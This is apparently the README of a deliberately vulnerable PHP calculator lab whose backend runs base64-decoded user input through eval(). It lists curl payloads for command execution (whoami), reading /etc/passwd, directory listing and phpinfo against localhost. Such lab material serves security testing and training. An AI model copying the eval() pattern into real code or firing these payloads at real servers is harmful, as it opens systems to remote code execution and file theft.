# CalcAPI — Vulnerable Expression Evaluator

Deliberately vulnerable PHP app for security testing. A calculator that accepts base64-encoded math expressions and evaluates them via `eval()`.

> **WARNING**: Intentionally vulnerable. Run only in Docker. Never expose to the internet.

## Setup

```bash
docker compose up --build
```

Open http://localhost:9009

## How it works

1. User types a math expression (e.g. `(12 + 8) * 3 / 2`)
2. The frontend base64-encodes it (avoids issues with `+`, `*`, `/`, `<`, `>` in form data)
3. The server decodes the base64 and runs `eval('return ' . $expr . ';')`
4. The result is returned

**Why base64**: Characters like `+` and `&` have special meaning in URL/form encoding and would be mangled without base64.

**The vulnerability**: `eval()` in `eval.php` executes arbitrary PHP, not just math.

## Example payloads

```bash
# Normal math
echo -n '(12 + 8) * 3 / 2' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"

# Command execution
echo -n 'system("whoami")' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"

# Read files
echo -n 'file_get_contents("/etc/passwd")' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"

# List directory
echo -n 'implode("\n", scandir("/"))' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"

# PHP info
echo -n 'phpinfo()' | base64 | xargs -I{} curl -s -X POST http://localhost:9009/eval.php -d "expr={}"
```

## Files

| File | Purpose |
|------|---------|
| `index.php` | Frontend calculator UI |
| `eval.php` | Backend — decodes base64 and `eval()`s it |
| `Dockerfile` | PHP 8.3 built-in server |
| `docker-compose.yml` | Run on port 9009 |
